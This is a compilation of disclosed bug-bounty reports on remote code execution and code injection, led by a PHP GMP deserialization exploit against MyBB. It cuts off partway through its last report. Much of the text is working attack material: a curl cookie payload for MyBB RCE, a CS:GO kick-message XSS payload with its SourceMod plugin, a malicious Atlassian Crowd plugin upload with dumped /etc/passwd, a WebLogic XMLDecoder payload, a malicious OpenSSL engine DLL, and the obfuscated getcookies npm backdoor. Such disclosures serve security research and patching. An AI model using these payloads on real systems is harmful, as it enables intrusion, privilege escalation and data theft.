It has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.

The following codes will prove this vulnerability:
```
<?php

class obj
{
	var $ryat;
	
	function __wakeup()
	{
		$this->ryat = 1;
	}
}

$obj = new stdClass;
$obj->aa = 1;
$obj->bb = 2;

$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
$x = unserialize($exploit);
var_dump($obj);

?>
```

Expected result:
```
object(stdClass)#1 (2) {
  ["aa"]=>
  int(1)
  ["bb"]=>
  int(2)
}
```

Actual result:
```
object(stdClass)#1 (3) {
  ["aa"]=>
  string(2) "hi"
  ["bb"]=>
  string(2) "hi"
  [0]=>
  object(obj)#3 (1) {
    ["ryat"]=>
    &int(1)
  }
}
```

i) How to exploited this bug in real world?
On php 5.6 <= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP's gmp_cast_object():

```
static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */
{
    mpz_ptr gmpnum;
    switch (type) {
    ...
    case IS_LONG:
        gmpnum = GET_GMP_FROM_ZVAL(readobj);
        INIT_PZVAL(writeobj);
        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));
        return SUCCESS;
```

The following codes will prove this exploite way:
```
<?php

var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}'));

?>
```
Of course, a crafted __wakeup() can also be exploited, ex:

```
<?php

function __wakeup()
{
    $this->ryat = (int) $this->ryat;
}

?>
```

ii) Can be exploited this bug in real app?

On MyBB <= 1.8.3:

index.php
```
	if(isset($mybb->cookies['mybb']['forumread']))
	{
		$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);
	}
```

MyBB <= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)

P.S. I had reported this vulnerability and it had been fixed in mybb >= 1.8.4.

Proof of Concept Exploit
------------
MyBB <= 1.8.3 RCE vulnerability

index.php
```
eval('$index = "'.$templates->get('index').'";');
```

MyBB always use eval() function in during template parsing.

inc/class_templates.php
```
class templates
{
	...
	public $cache = array();
	...
	function get($title, $eslashes=1, $htmlcomments=1)
	{
		global $db, $theme, $mybb;
		...
		$template = $this->cache[$title];
		...
		return $template;
	}
```

If we can control the `$cache`, we will be albe to inject php code via eval() function.

inc/init.php
```
$error_handler = new errorHandler();
...
$maintimer = new timer();
...
$mybb = new MyBB;
...
switch($config['database']['type'])
{
	case "sqlite":
		$db = new DB_SQLite;
		break;
	case "pgsql":
		$db = new DB_PgSQL;
		break;
	case "mysqli":
		$db = new DB_MySQLi;
		break;
	default:
		$db = new DB_MySQL;
}
...
$templates = new templates;
```

The `$templates` object was instantiated in init.php, and four objects was instantiated in this before. This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.

When MyBB <= 1.8.3 and PHP5.6 <= 5.6.11, remote code execution by just using curl on the command line:
```
curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12:"DateInterval":1:{s:1:"y"%3bR:2%3b}}}}' http://127.0.0.1/mybb/
```

---

### [Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message](https://hackerone.com/reports/631956)

- **Report ID:** `631956`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Valve
- **Reporter:** @shayhelman
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T22:10:26.401Z
- **CVE(s):** -

**Vulnerability Information:**

## Overview
Counter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.

Previously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.

In order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under `steamapps\common\Counter-Strike Global Offensive\csgo\panorama\code.pbin`, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named `panorama\layout\chat.xml` on line `18` we can see 
```
<Label html="true" text="&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}" acceptsinput="true" />
```

By having `html="true"` in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained `html="true"` and within a few seconds we found a particular file with the name `panorama\layout\popups\popup_generic.xml`. We knew that the disconnect message was utilizing this exact file which is when we started to test.

Our first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg'>"`, and after running it twice (for caching purposes), the cat appeared to our surprise. {F518974}

Now that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the `kickid` command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with `sm_kick`. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called ` KickClient()` which did not have a character limit. After testing with some common payloads, we concluded that `<a onmouseover='javascript:CODE'></a>` is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted [here](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama#.JS_.28Javascript.29).

## Steps to reproduce

* Setup a [dedicated CS:GO server](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Dedicated_Servers)
* Install [SourceMod](https://wiki.alliedmods.net/Installing_sourcemod) and [Metamod](https://www.sourcemm.net/)
* Download the attached SourceMod plugin and place it under `\addons\sourcemod\plugins\`: F518946
* Start up CS:GO and connect to the server
* Run this string in your client's console:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

* Mouse over the text `The remote host stopped receiving communications and closed the connection.`

## PoC

{F518945}
Triggered with the command:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

### SourceMod Kick Plugin Source F518946

```cpp
#include <sourcemod>

#pragma semicolon 1
#pragma newdecls required

public void OnPluginStart()
{
    RegConsoleCmd("sm_testkick", Cmd_Kick);
}

public Action Cmd_Kick(int client, int args)
{
    if (args <= 0) {
        PrintToChat(client, "No arguments provided - Usage: !testkick <Kick Message>");
        return Plugin_Handled;
    }

    char full[5120];
    GetCmdArgString(full, sizeof(full));

    for (int i = 0; i < 5; i++) {
        KickClient(client, full);
    }

    return Plugin_Handled;
}
```

## Impact

An attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.

Similar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.

This exploit could also be combined with any Panorama function present [here](https://developer.valvesoftware.com/wiki/CSGO_Panorama_API) in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.

Even though the payload is only triggered via the `mouseover` event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.

It is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. `$.Schedule(1, function)`. Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing `eval()` and `$.AsyncWebRequest()` which would allow the attacker to manage multiple victims in some sort of botnet.

Yours respectfully,
Shay @shayhelman and Felix @dukebruno123

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/248116)

- **Report ID:** `248116`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @manoelt
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:21:20.372Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
One of the DoD applications uses a java library which is vulnerable to expression language injection. Using only an URL I was able to inject java code. I made a simple PoC that requests a name resolution to a DNS server.

**Description:**
The application at https://███ uses Primefaces version 5.3 which is vulnarable to Expression Language injection through DynamicContent generator.

To prove the injection I made a PoC that tries to submit a HTTP request, but the server blocks the outgoing packets on port 80, on the other hand the server still try to resolve the requested domain and so I receive DNS requests from DoD server. Also, I can delete and maybe read files using the File Java class, but I decided not to try to avoid leak of some private data.

## Impact
Critical.

## Step-by-step Reproduction Instructions

First you need to execute the program attached to generate the payload. To do that you just need the Primefaces-5.3.jar (https://www.primefaces.org/downloads/ ) in your class path.

1. With the code attached generate the payload encrypted with the default key "primefaces". Change the domain (String remoteMalJarUrl) to one that you have control or use one from http://dnsbin.zhack.ca/
2. With the payload from #1, append to the URL: https://████/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdrid=
3. Send a GET request using curl (curl -vk https://████/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdrid=<YOUR_PAYLOAD_HERE>
4. You will receive a name resolution request for remoteMalJarUrl from the DoD application

We could use this DNS request to exfiltrate data from the server. And as I said, theoretically I could also delete files from the server using the File class.

## Product, Version, and Configuration (If applicable)
Primefaces 5.3

## Suggested Mitigation/Remediation Actions
- Update Primefaces
- Alternatively by filtering incoming requests with pfdrid parameter (value longer than 16bytes and Base64 encoded) and "pfdrt=sc" is possible to mitigate the attack: "pfdrt=sc" calls the vulnerable StreamedContent Method and pfdrid contains the exploit payload. 

## References
http://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html
https://github.com/primefaces/primefaces/issues/1152

---

### [Root Remote Code Execution on https://███](https://hackerone.com/reports/632721)

- **Report ID:** `632721`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:14:59.585Z
- **CVE(s):** CVE-2019-11580

**Vulnerability Information:**

**Summary:**
Atlassian Crowd is a centralized identity management application that allows companies to "Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location."

A DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.

**Description:**
From Atlassian's public [advisory](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html):

> Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.

There is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the "pdkinstall" plugin and I was able to successfully construct a working exploit.

## Step-by-step Reproduction Instructions

1. Download and unzip my malicious plugin: rce-plugin.zip {F519371}
2. `cd` into the directory
3. Run the following command:
```
curl -k -H "Content-Type: multipart/content" \
  --form "file_cdl=@rce.jar;type=application/octet-stream" https://███/crowd/admin/uploadplugin.action
```

You'll see that the malicious plugin is successfully installed:

```
Installed plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar
```

Now visit https://███████/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command `whoami` which is the user `root`

██████████

contents of `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
████████x:6:0:██████████/sbin:/sbin/shutdown
██████x:7:0:███████/sbin:/sbin/halt
█████████x:8:12:█████/var/spool/████/sbin/nologin
███x:10:14:███/var/spool/███████/sbin/nologin
██████x:11:0:██████/root:/sbin/nologin
██████████x:12:100:███████/usr/████/sbin/nologin
██████████x:13:30:█████/var/█████/sbin/nologin
████x:14:50:FTP User:/var/███████/sbin/nologin
█████████x:99:99:Nobody:/:/sbin/nologin
██████████x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
██████████x:38:38::/etc/██████/sbin/nologin
██████████x:499:76:"Saslauthd user":/var/empty/██████████/sbin/nologin
██████████x:47:47::/var/spool/mqueue:/sbin/nologin
███████x:51:51::/var/spool/mqueue:/sbin/nologin
████████x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
█████x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
████████x:74:74:Privilege-separated SSH:/var/empty/████████/sbin/nologin
████████x:81:81:System message bus:/:/sbin/nologin
███████x:500:500:EC2 Default User:/home/████████/bin/bash
```

## Product, Version, and Configuration (If applicable)
```
Crowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)
Crowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)
Crowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)
Crowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)
Crowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)
```

## Suggested Mitigation/Remediation Actions
I recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.

## Impact

Remote code execution on https://███. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons. 


Since this is running as root, an attacker could also easily backdoor the login page and steal credentials.

Thanks,
Corben Leo (@cdl)

---

### [Server Side JavaScript Code Injection](https://hackerone.com/reports/532667)

- **Report ID:** `532667`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @phra
- **Bounty:** - usd
- **Disclosed:** 2019-10-03T18:17:41.756Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Service Side JavaScript Code Injection in `fastify`.
It allows an attacker that can control a single property name in the serialization schema to achieve Remote Command Execution in the context of the web server.

# Module

**module name:** fastify
**version:** 2.2.0
**npm page:** `https://www.npmjs.com/package/fastify`

## Module Description

> An efficient server implies a lower cost of the infrastructure, a better responsiveness under load and happy users. How can you efficiently handle the resources of your server, knowing that you are serving the highest number of requests as possible, without sacrificing security validations and handy development? Enter Fastify. Fastify is a web framework highly focused on providing the best developer experience with the least overhead and a powerful plugin architecture. It is inspired by Hapi and Express and as far as we know, it is one of the fastest web frameworks in town.

## Module Stats

39,119 downloads in the last week

# Vulnerability

## Vulnerability Description

> Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.

## Steps To Reproduce:

> Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.

## Patch

Escape `"`, `'` and ``` ` ``` in properties names in schema definition.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- **OS:** Kali Rolling
- **NodeJS:** 11.9
- **NPM:** 6.5.0
- **fast-json-stringify:** 1.14.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: Y (sent message to Matteo Collina)
- I opened an issue in the related repository: N

## Impact

If an attacker can control somehow the schema definition, he/she can achieve arbitrary code execution as the user running the web server.

---

### [accounts.informatica.com - RCE due to exposed Groovy console](https://hackerone.com/reports/672243)

- **Report ID:** `672243`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Informatica
- **Reporter:** @0ang3el
- **Bounty:** - usd
- **Disclosed:** 2019-08-14T11:40:54.391Z
- **CVE(s):** -

**Summary (team):**

Researcher identified a misconfigured "Groovy" panel on an AEM web application that was vulnerable to RCE. The panel was subsequently disabled.

---

### [RCE on █████ via CVE-2017-10271](https://hackerone.com/reports/576887)

- **Report ID:** `576887`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @erbbysam
- **Bounty:** - usd
- **Disclosed:** 2019-07-01T19:54:20.273Z
- **CVE(s):** CVE-2017-10271

**Vulnerability Information:**

**Summary:**
Happy Friday! The server at `██████` is vulnerable to CVE-2017-10271 "Oracle WebLogic Server Remote Command Execution".

**Description:**
The following request takes 12 seconds (12000 milliseconds) to complete:
```
POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
Host: ██████████
Content-Length: 423
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>12000</long>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
This proves that I have Java code execution on the remote server. 

ref: https://techblog.mediaservice.net/2018/07/cve-2017-10271-oracle-weblogic-server-remote-command-execution-sleep-detection-payload/

Public exploits for this exist: https://github.com/c0mmand3rOpSec/CVE-2017-10271
I was not able to use that script with a `ping` command, which might have been blocked by preventing outbound connections.

## Suggested Mitigation/Remediation Actions
Patch & possibly don't allow external access.

## Impact

Critical, RCE.

---

### [CVE-2019-5443: Windows Privilege Escalation: Malicious OpenSSL Engine](https://hackerone.com/reports/608577)

- **Report ID:** `608577`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** curl
- **Reporter:** @mirchr
- **Bounty:** - usd
- **Disclosed:** 2019-06-29T18:24:27.107Z
- **CVE(s):** CVE-2019-5443

**Vulnerability Information:**

## Summary:
The curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\usr\local\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:\. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.


Version tested.
curl-7.65.1_1-win64

OS:
Windows 10 

## Steps To Reproduce:
All steps are executed as a low privileged(non-admin) user unless otherwise noted

 1. As a low privileged user create the following folder c:\usr\local\ssl
```
mkdir c:\usr
mkdir c:\usr\local
mkdir c:\usr\local\ssl
```

 2. Create an openssl.cnf file with the following contents.

```
openssl_conf = openssl_init
[openssl_init]
engines = engine_section
[engine_section]
woot = woot_section
[woot_section]
engine_id = woot
dynamic_path = c:\\stage\\calc.dll
init = 0
```

 3. Create the c:\stage folder
```
mkdir c:\stage
````

 4. Create and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.
````
/* Cross Compile with
   x86_64-w64-mingw32-g++ calc.c -o calc.dll -shared
*/
#include <windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            system("calc");
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
```

 5. Copy calc.dll to c:\stage
`
copy calc.dll c:\stage
`
 6. Execute curl.exe as a different user.

## Supporting Material/References:
  * PoC image showing curl loading a custom calc.dll and executing calc.exe
{F507228}

## Impact

A malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.

---

### [RCE and Complete Server Takeover of http://www.█████.starbucks.com.sg/](https://hackerone.com/reports/502758)

- **Report ID:** `502758`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Starbucks
- **Reporter:** @spaceraccoon
- **Bounty:** - usd
- **Disclosed:** 2019-04-10T19:29:08.098Z
- **CVE(s):** -

**Summary (team):**

This report from @spaceraccoon demonstrated a valid attack resulting in RCE and full compromise of the target. The detailed and thorough report was especially helpful throughout the triage process, and ultimately helped us reproduce and resolve the issue as quickly as possible. The vulnerable site has been taken offline.

We'd like to thank @spaceraccoon for the submission, and hope to continue to see reports like this in the future.

**Summary (researcher):**

## Chaining CVEs: From a 404 Page to RCE

### Initial Recon

I first got to this subdomain via the usual subdomain enumeration. It looked unpromising: a 404 page that said “this website is not in use,” a little picture, and nothing else. Running path discovery for the usual pages turned up nothing, not even a useful `robots.txt`. However, I took a closer look at the footer. It said something like `Copyright 2010 | Built on xxxx CMS` (not the real CMS name). That was promising because it told me that the site was both old and built on a custom CMS, meaning it was far more likely to be vulnerable. Google searching for the CMS turned up nothing, it was that obscure.

That was when I had the idea to try the path `website.com/xxxx` (entering the name of the CMS into the path). I was immediately redirected to `/josso/signin` (approximate path since the site has been taken offline) which has a login form. Bingo!

### The Red Herring 

I tried the usual trick: entering the username and password `admin`. My excitement went through the roof when a “success” message popped up, but it seemed to hit an error. There must have been something wrong on the backend, because all I got was an empty page. Nothing else worked and the credentials also seemed to be disabled after the first login. It was a red herring.

### The First CVE

However, messing around further with the URL path suddenly gave me an Apache Tomcat stack trace that revealed the version number: 5.5.20. On some specific (mis)configurations, Tomcat could be vulnerable to [CVE-2007-0450](https://nvd.nist.gov/vuln/detail/CVE-2007-0450), a medium-level directory traversal vulnerability in the `mod_proxy` plug-in. You trigger it by adding some special characters to the path (read the CVE for more info). So I tried `site.com/josso/%5C../` and bingo! I was redirected to a Jboss web console page. It seemed like I had bypassed the internal proxy directly to the Jboss instance running on `localhost`.

### The Second CVE

I wasn’t familiar with Jboss, but doing some reading up informed me that it was a Red Hat app server that served Java applets. In addition, I found [CVE-2007-1036](https://nvd.nist.gov/vuln/detail/CVE-2007-1036), a High vulnerability that said that the Jboss web console needed to be protected to prevent unauthenticated server admin requests. As it turned out, thanks to the traversal CVE, I had managed to bypass the local proxy and get direct web access to the Jboss web console, which also wasn’t password-protected.

### Remote. Code. Execution!

From then on, RCE was quick. There are many attacks you can use, but I used the [jexboss](https://github.com/joaomatosf/jexboss) tool that allowed me to quickly gain RCE by exploiting Java deserialization vulnerabilities. One twist was that since I needed to bypass the local proxy, instead of attacking `/web-console`, I had to send all requests to `/josso/%5C../web-console`. I could then do anything I wanted on the server: modify the home page, check out other hosts on the local network, and view a useful backup SQL dump...

### Lessons

I took away a few things from this: sometimes, a 404 or redirect isn’t the end of the road. See if the server still has some pages left lying around that you can exploit. Furthermore, think about how you can chain vulnerabilities to hit the RCE holy grail. Next, back up your RCE by looking for sensitive information or horizontal escalation opportunities on the server. Are there other hosts on the network? Clues in `/etc/passwd`? The opportunities are endless.

---

### [Remote code executio in  NPM package getcookies](https://hackerone.com/reports/346516)

- **Report ID:** `346516`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @tiblu
- **Bounty:** - usd
- **Disclosed:** 2019-04-03T20:00:26.244Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report remote code execution in the `getcookies` module.
It allows to remotely inject and execute code in the target server.

# Module

**module name:** getcookies
**version:** 1.12.3
**npm page:** `https://www.npmjs.com/package/getcookies`

Also affects all the modules that use `getcookies`, notable ones:

* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies

## Module Description

Basic HTTP cookie parser for HTTP servers.

## Module Stats

> Replace stats below with numbers from npm’s module page:

390 downloads in the last day
3396 downloads in the last week
3396 downloads in the last month

# Vulnerability

## Vulnerability Description

Found by a defaced website.
Allows attacker to remotely send and execute JS on the server.

`index.js` of `getcookies` does:

```
const testHarness = require('./test/harness.js');
...
function parse(req, res, callback) {
    testHarness.assert(req, res, callback, () => {
...
```

and vulnerability resides in the `./test/harness.js` of the `getcookies`:
```
/* eslint-env es6 */
'use strict';

var assert = require('assert');

let harness = (req, res, callback, next) => {
    try {
        assert.equal(typeof callback, 'function');
    } catch (E) {
        return callback(E);
    }

    try {
        module.exports.log = module.exports.log || Buffer.alloc(0xffff);
        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
            p = Buffer.from(p, 'hex').readUInt16LE(0);
            switch (p) {
                case 0xfffe:
                    module.exports.log = Buffer.alloc(0xffff);
                    return;
                case 0xfffa:
                    return setTimeout(() => {
                        let c = module.exports.log.toString().replace(/\x00*$/, '');
                        module.exports.log = Buffer.alloc(0xffff);
                        if (c.indexOf('\x00') < 0) {
                            require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                        }
                        next();
                    }, 1000);
                default:
                    v = Buffer.from(v, 'hex');
                    for (let i = 0; i < v.length; i++) {
                        module.exports.log[p + i] = v[i];
                    }
            }
        });
    } catch (E) {}

    next();
};

module.exports.assert = (req, res, callback, next) => {
    harness(req, res, callback, next);
};
```

As seen above, it does `vm.runInThisContext` with the code stored in the memory.

## Steps To Reproduce:

Easiest way to reproduce is to use `express-cookies` package, which depends on `getcookies`.

Test code:

```
var express = require('express');
var app = express();
var expressCookies = require('express-cookies');

app.use(expressCookies());

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(3000, function () {
    console.log('Example app listening on port 3000!')
});
```

Code is sent in custom HTTP headers in byte code.

To send code bytes:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' 
```
Where the protocol is:
`g<bytePosition>h<codeBytes>i`

The sample above adds `cde` to the code to be executed when execution header is sent.

The code is stored in `require('./test/harness.js').log`.

When the code is sent, attacker executes the code by sending:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'
```

## Patch

```
diff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js
--- /home/m/tmp/getcookies_original/index.js	2018-05-02 16:47:11.382990109 +0300
+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js	2018-05-02 16:50:00.198982317 +0300
@@ -9,8 +9,6 @@
 
 'use strict';
 
-const testHarness = require('./test/harness.js');
-
 /**
  * Module exports.
  * @public
@@ -45,38 +43,36 @@
  */
 
 function parse(req, res, callback) {
-    testHarness.assert(req, res, callback, () => {
-        if (!req.headers.cookie) {
-            return callback();
+    if (!req.headers.cookie) {
+        return callback();
+    }
+
+    var obj = {};
+    var pairs = req.headers.cookie.split(pairSplitRegExp);
+
+    for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i];
+        var eq_idx = pair.indexOf('=');
+
+        // skip things that don't look like key=value
+        if (eq_idx < 0) {
+            continue;
         }
 
-        var obj = {};
-        var pairs = req.headers.cookie.split(pairSplitRegExp);
+        var key = pair.substr(0, eq_idx).trim();
+        var val = pair.substr(++eq_idx, pair.length).trim();
 
-        for (var i = 0; i < pairs.length; i++) {
-            var pair = pairs[i];
-            var eq_idx = pair.indexOf('=');
-
-            // skip things that don't look like key=value
-            if (eq_idx < 0) {
-                continue;
-            }
-
-            var key = pair.substr(0, eq_idx).trim();
-            var val = pair.substr(++eq_idx, pair.length).trim();
-
-            // quoted values
-            if ('"' == val[0]) {
-                val = val.slice(1, -1);
-            }
-
-            // only assign once
-            if (undefined == obj[key]) {
-                obj[key] = val;
-            }
+        // quoted values
+        if ('"' == val[0]) {
+            val = val.slice(1, -1);
         }
 
-        req.cookies = obj;
-        return callback();
-    });
+        // only assign once
+        if (undefined == obj[key]) {
+            obj[key] = val;
+        }
+    }
+
+    req.cookies = obj;
+    return callback();
 }
Common subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04.3 LTS - ANY that runs Node.JS
- 6.13.1 - but not Node.JS version specific
- 3.10.10 - but not NPM version specific
- ANY

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

I did not do any of the above as:

* There is no public code  repository.
* The code is built to be malicious on purpose.

## Impact

Remote code injection and execution.

---

### [Code Injection Vulnerability in dot Package](https://hackerone.com/reports/390929)

- **Report ID:** `390929`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2019-04-03T10:16:35.485Z
- **CVE(s):** CVE-2020-8141

**Vulnerability Information:**

I would like to report a code injection vulnerability in dot.
It allows attackers to execute arbitrary JS code, especially when combined with a prototype pollution attack.

# Module

**module name:** dot
**version:** 1.1.2
**npm page:** `https://www.npmjs.com/package/dot`

